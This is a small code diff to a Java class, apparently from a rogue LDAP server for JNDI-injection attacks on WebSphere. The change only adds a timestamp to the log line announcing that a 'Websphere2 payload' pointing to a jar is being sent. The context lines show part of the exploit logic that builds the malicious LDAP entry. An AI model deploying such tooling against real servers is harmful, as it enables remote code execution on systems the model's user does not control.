@@ -11,6 +11,7 @@ import com.unboundid.ldap.sdk.ResultCode;
 import javax.naming.Reference;
 
 import java.util.Properties;
+import java.sql.Timestamp;
 
 import static artsploit.Utilities.serialize;
 
@@ -37,8 +38,9 @@ public class WebSphere2 implements LdapController {
         String localJar = Utilities.getDnParam(result.getRequest().getBaseDN(), "jar");
         if(localJar == null)
             localJar = Config.localjar; //get from config if not specified
-
-        System.out.println("Sending Websphere2 payload pointing to " + localJar);
+        
+        Timestamp timestamp = new Timestamp(System.currentTimeMillis());
+        System.out.println(timestamp + " Sending Websphere2 payload pointing to " + localJar);
 
         Entry e = new Entry(base);
         e.addAttribute("javaClassName", "java.lang.String"); //could be any
